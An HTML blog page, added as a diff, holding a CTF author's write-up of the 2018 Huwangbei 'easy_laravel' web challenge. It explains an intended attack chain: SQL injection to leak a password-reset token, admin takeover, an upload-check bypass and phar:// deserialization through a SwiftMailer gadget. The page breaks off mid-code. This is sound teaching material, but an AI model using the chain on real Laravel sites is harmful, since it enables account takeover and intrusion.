@@ -1,0 +1,353 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" integrity="sha512-ygEyjMC6rqnzJqWGjRTJUPYMEs9JUOm3i7OWUS9CgQ4XkBUvMsgCS1I8JqavidQ2ClHcREB7IbA2mN08+r9Elg==" crossorigin="anonymous" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js" integrity="sha512-9DNXrSjk17bU9MUbRp3IjwcWe46V8FaGA062PFbryPUAEQVRbz4jiZP6FW0AdbqEGtMYBDWnul3eiGBMJOQajA==" crossorigin="anonymous"></script>
+  
+  
+    <meta name="keywords" content="writeup,web,护网杯,laravel," />
+  
+
+  
+    <meta name="description" content="护网杯2018 easy_laravel出题记录" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/logo.png">
+  <title>护网杯2018 easy_laravel出题记录 [ 4uuu Nya&#39;s HomePage ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="https://qvq.im/images/logo.png">
+    <span class="title">4uuu Nya&#39;s HomePage</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">Home</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">Archives</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">Tags</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/friends" class="pure-menu-link">Friends</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">About</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        护网杯2018 easy_laravel出题记录
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2018-10-14T16:54:08.000Z">
+        2018-10-14
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/laravel/" rel="tag">laravel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A4%E7%BD%91%E6%9D%AF/" rel="tag">护网杯</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <h1 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h1><p>在登录等页面查看源码，可以得到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/qqqqqqvq/easy_laravel --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到代码，开始审计 (很多人都说我代码没给全，拿到代码之后就算不了解laravel，看到composer.json也知道应该 <code>composer install</code> 一下呀)</p>
+<hr>
+<p>首先看一下路由，看看有什么操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>); &#125;);</span><br><span class="line">Auth::routes();</span><br><span class="line">Route::get(<span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;HomeController@index&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/note&#x27;</span>, <span class="string">&#x27;NoteController@index&#x27;</span>)-&gt;name(<span class="string">&#x27;note&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/upload&#x27;</span>, <span class="string">&#x27;UploadController@index&#x27;</span>)-&gt;name(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/upload&#x27;</span>, <span class="string">&#x27;UploadController@upload&#x27;</span>)-&gt;name(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;FlagController@showFlag&#x27;</span>)-&gt;name(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/files&#x27;</span>, <span class="string">&#x27;UploadController@files&#x27;</span>)-&gt;name(<span class="string">&#x27;files&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/check&#x27;</span>, <span class="string">&#x27;UploadController@check&#x27;</span>)-&gt;name(<span class="string">&#x27;check&#x27;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/error&#x27;</span>, <span class="string">&#x27;HomeController@error&#x27;</span>)-&gt;name(<span class="string">&#x27;error&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到 <code>Auth::routes()</code> ，这个路由是 Laravel 默认提供的一套关于用户系统的脚手架，所以可以推测出开发的操作是 <code>php artisan make:auth</code></p>
+<p>具体的路由可以在 <code>Illuminate/Routing/Router.php</code> 中找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Register the typical authentication routes for an application.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Authentication Routes...</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;Auth\LoginController@showLoginForm&#x27;</span>)-&gt;name(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;post(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;Auth\LoginController@login&#x27;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;post(<span class="string">&#x27;logout&#x27;</span>, <span class="string">&#x27;Auth\LoginController@logout&#x27;</span>)-&gt;name(<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Registration Routes...</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;register&#x27;</span>, <span class="string">&#x27;Auth\RegisterController@showRegistrationForm&#x27;</span>)-&gt;name(<span class="string">&#x27;register&#x27;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;post(<span class="string">&#x27;register&#x27;</span>, <span class="string">&#x27;Auth\RegisterController@register&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Password Reset Routes...</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;password/reset&#x27;</span>, <span class="string">&#x27;Auth\ForgotPasswordController@showLinkRequestForm&#x27;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;post(<span class="string">&#x27;password/email&#x27;</span>, <span class="string">&#x27;Auth\ForgotPasswordController@sendResetLinkEmail&#x27;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;password/reset/&#123;token&#125;&#x27;</span>, <span class="string">&#x27;Auth\ResetPasswordController@showResetForm&#x27;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;post(<span class="string">&#x27;password/reset&#x27;</span>, <span class="string">&#x27;Auth\ResetPasswordController@reset&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或者直接在目录下 <code>php artisan route:list</code> ，这里也可以很方便的看到有auth, admin 这两个看起来很敏感的中间件名称</p>
+<p><img src="/images/20181014093317.png"></p>
+<p>几乎所有操作都需要进行登录，而且 <code>UploadController</code> 和 <code>FlagController</code> 都使用了一个叫做 <code>admin</code> 的中间件，在 <code>app/Http/Middleware/AdminMiddleware.php</code> 中可以看到代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;auth-&gt;user()-&gt;email !== <span class="string">&#x27;admin@qvq.im&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> redirect(route(<span class="string">&#x27;error&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要当前用户的邮箱为 <code>admin@qvq.im</code> ，这时发现使用这个邮箱是注册不上的，因为系统已经内置了这个管理员z账号，但是看到 <code>NoteController.php</code> 中，存在一个非常明显的SQL注入漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Note <span class="variable">$note</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = Auth::user()-&gt;name;</span><br><span class="line">    <span class="variable">$notes</span> = DB::select(<span class="string">&quot;SELECT * FROM `notes` WHERE `author`=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;note&#x27;</span>, compact(<span class="string">&#x27;notes&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用户表中的密码是经过 <code>bcrypt</code> 处理的，注入出来没办法解开，然而在laravel5.4中，重置密码的操作很有意思 <code>Illuminate\Auth\Passwords\PasswordBroker.php</code></p>
+<p>首先是发送重置链接的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendResetLink</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$credentials</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// First we will check to see if we found a user at the given credentials and</span></span><br><span class="line">    <span class="comment">// if we did not we will redirect back to this current URI with a piece of</span></span><br><span class="line">    <span class="comment">// &quot;flash&quot; data in the session to indicate to the developers the errors.</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">$this</span>-&gt;getUser(<span class="variable">$credentials</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">static</span>::INVALID_USER;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Once we have the reset token, we are ready to send the message out to this</span></span><br><span class="line">    <span class="comment">// user with a link to reset their password. We will then redirect back to</span></span><br><span class="line">    <span class="comment">// the current URI having nothing set in the session to indicate errors.</span></span><br><span class="line">    <span class="variable">$user</span>-&gt;sendPasswordResetNotification(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tokens-&gt;create(<span class="variable">$user</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">static</span>::RESET_LINK_SENT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到如果存在这个用户的话，有个生成token的操作，实现在<code>Illuminate\Auth\Passwords\DatabaseTokenRepository.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">CanResetPasswordContract <span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$user</span>-&gt;getEmailForPasswordReset();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;deleteExisting(<span class="variable">$user</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// We will create a new, random token for the user so that we can e-mail them</span></span><br><span class="line">    <span class="comment">// a safe link to the password reset form. Then we will insert a record in</span></span><br><span class="line">    <span class="comment">// the database so that we can verify the token within the actual reset.</span></span><br><span class="line">    <span class="variable">$token</span> = <span class="keyword">$this</span>-&gt;createNewToken();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;getTable()-&gt;insert(<span class="keyword">$this</span>-&gt;getPayload(<span class="variable">$email</span>, <span class="variable">$token</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createNewToken</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, Str::random(<span class="number">40</span>), <span class="keyword">$this</span>-&gt;hashKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getPayload</span>(<span class="params"><span class="variable">$email</span>, <span class="variable">$token</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$email</span>, <span class="string">&#x27;token&#x27;</span> =&gt; <span class="variable">$token</span>, <span class="string">&#x27;created_at&#x27;</span> =&gt; <span class="keyword">new</span> Carbon];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是直接把生成出来的token写入了数据库中，所以我在开头放了一个注入，本意就是注入出这个token去重置<a href="mailto:&#x61;&#x64;&#109;&#105;&#110;&#64;&#113;&#x76;&#x71;&#x2e;&#x69;&#x6d;">&#x61;&#x64;&#109;&#105;&#110;&#64;&#113;&#x76;&#x71;&#x2e;&#x69;&#x6d;</a>的密码，可是好像很多人都被users表里的remember_token误导了</p>
+<h4>这也是使用 Laravel 5.4的原因，在高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入，就和用户密码一样</h4>
+
+<p>重置密码使用管理员帐号登录后，会发现有 <code>upload</code>, <code>files</code> 与 <code>flag</code> 三个路由，通过查看 <code>FlagController.php</code>  可以发现直接就打印flag了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是直接访问会发现页面提示 <code>no flag</code>，这里页面内容不一致，在 laravel 中，模板文件是存放在 <code>resources/views</code> 中的，然后会被编译放到 <code>storage/framework/views</code> 中，而编译后的文件存在过期的判断。</p>
+<p>在 <code>Illuminate/View/Compilers/Compiler.php</code> 中可以看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Determine if the view at the given path is expired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string  $path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isExpired</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$compiled</span> = <span class="keyword">$this</span>-&gt;getCompiledPath(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the compiled file doesn&#x27;t exist we will indicate that the view is expired</span></span><br><span class="line">    <span class="comment">// so that it can be re-compiled. Else, we will verify the last modification</span></span><br><span class="line">    <span class="comment">// of the views is less than the modification times of the compiled views.</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;files-&gt;exists(<span class="variable">$compiled</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$lastModified</span> = <span class="keyword">$this</span>-&gt;files-&gt;lastModified(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lastModified</span> &gt;= <span class="keyword">$this</span>-&gt;files-&gt;lastModified(<span class="variable">$compiled</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而过期时间是依据文件的最后修改时间来判断的，所以判断服务器上编译后的文件最后修改时间大于原本模板文件，那么怎么去删除(修改)编译后的文件? </p>
+<p>再来看看 <code>UploadController</code> 的上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">UploadRequest <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;file(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$file</span> &amp;&amp; <span class="variable">$file</span>-&gt;isValid())) &#123;</span><br><span class="line">        <span class="variable">$allowed_extensions</span> = [<span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;getClientOriginalExtension();</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>))&#123;</span><br><span class="line">            <span class="variable">$file</span>-&gt;move(<span class="keyword">$this</span>-&gt;path, <span class="variable">$file</span>-&gt;getClientOriginalName());</span><br><span class="line">            Flash::success(<span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> redirect(route(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Flash::error(<span class="string">&#x27;上传失败&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里只能上传后缀为图片的文件，我在 <code>UploadRequest</code> 中限制了文件必须为 <code>image</code> ，但是这个基本上是个摆设，很好绕过，可以看到文件是被上传到了 <code>$this-&gt;path</code>，也就是 <code>storage/app/public</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware([<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;path = storage_path(<span class="string">&#x27;app/public&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个目录是没办法直接访问的，那么就算是能成功上传脚本文件也是没办法的，往下看还有两个方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">files</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = array_except(Storage::allFiles(<span class="string">&#x27;public&#x27;</span>), [<span class="string">&#x27;0&#x27;</span>]);</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;files&#x27;</span>)-&gt;with(<span class="string">&#x27;files&#x27;</span>, <span class="variable">$files</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;path&#x27;</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$path</span> . <span class="variable">$filename</span>))&#123;</span><br><span class="line">            Flash::error(<span class="string">&#x27;磁盘文件已删除，刷新文件列表&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Flash::success(<span class="string">&#x27;文件有效&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;files&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>files</code> 是取出上传目录下的文件并展示， <code>check</code> 方法检查文件是否仍存在于磁盘上，这里接收了两个参数 <code>path</code> 和 <code>filename</code> ，那么就相当于文件路径完全可控，但是这里只经过了 <code>file_exists</code> ，貌似没什么用</p>
+<p>但是 <code>file_exists</code> 中的参数完全可控，所以可以使用 <code>phar://</code> 协议来触发一次反序列化操作</p>
+<p>浏览一遍程序会发现没有可用的组件，但 <code>laravel</code> 里可供寻找的组件实在是太多了</p>
+<p><img src="/images/20181014093812.png"></p>
+<p>搜索一下 <code>__destruct</code> </p>
+<p><img src="/images/20181014093756.png"></p>
+<p>这里看看 <code>swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</code> </p>
+<p>swiftmailer 是一个默认组件，用于邮件功能，跟入这个类看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filePath</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;FileByteStream&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filePath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;Failed to retrieve temporary file name.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$filePath</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$content</span> = file_get_contents(<span class="keyword">$this</span>-&gt;getPath())) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;Failed to get temporary file content.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 